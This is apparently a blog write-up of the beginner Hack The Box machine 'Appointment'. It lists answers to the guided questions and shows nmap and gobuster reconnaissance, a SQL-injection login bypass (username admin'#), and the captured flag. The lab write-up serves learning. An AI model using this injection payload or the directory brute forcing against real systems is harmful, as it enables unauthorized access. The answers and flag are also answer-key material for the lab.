---
title: 🔵 HTB - Appointment
date: 2023-08-17
categories: [HackTheBox, Machines]
tags: [nmap, gobuster, sqli]
---

What does the acronym SQL stand for?

`Structured Query Language`

What is one of the most common type of SQL vulnerabilities?

`sql injection`

What is the 2021 OWASP Top 10 classification for this vulnerability?

`A03:2021-Injection`

What does Nmap report as the service and version that are running on port 80 of the target?

`Apache httpd 2.4.38 ((Debian))`

What is the standard port used for the HTTPS protocol?

`443`

What is a folder called in web-application terminology?

`directory`

What is the HTTP response code is given for 'Not Found' errors?

`404`

Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?

`dir`

What single character can be used to comment out the rest of a line in MySQL?

`#`

If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?

`Congratulations`

Submit root flag

```bash
$ nmap -sV -p- <ip>
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

$ gobuster dir -u <ip>:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
...
/images               (Status: 301) [Size: 317] [--> http://10.129.146.191/images/]
/css                  (Status: 301) [Size: 314] [--> http://10.129.146.191/css/]
/js                   (Status: 301) [Size: 313] [--> http://10.129.146.191/js/]
/vendor               (Status: 301) [Size: 317] [--> http://10.129.146.191/vendor/]
/fonts                (Status: 301) [Size: 316] [--> http://10.129.146.191/fonts/]
/server-status        (Status: 403) [Size: 279]
...

$ firefox <ip>:80 &
```

login: `admin'#`

password: `abc`

flag: `e3d0796d002a446c0e622226f42e9672`
